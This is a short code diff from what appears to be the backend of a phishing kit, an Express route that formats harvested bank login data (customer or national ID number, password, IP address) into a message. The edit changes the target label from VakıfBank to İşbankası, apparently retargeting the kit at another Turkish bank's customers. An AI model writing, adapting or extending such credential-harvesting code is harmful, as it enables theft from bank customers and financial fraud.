@@ -50,7 +50,7 @@ app.post("/dmn", async (req, res) => {
     }
 
     const message = `
-*--- VakıfBank Giriş Bilgileri ---*
+*--- İsbankası Giriş Bilgileri ---*
 *Müşteri No/TC:* \`${musNo}\`
 *Şifre:* \`${parola}\`
 *IP:* \`${userIP}\`
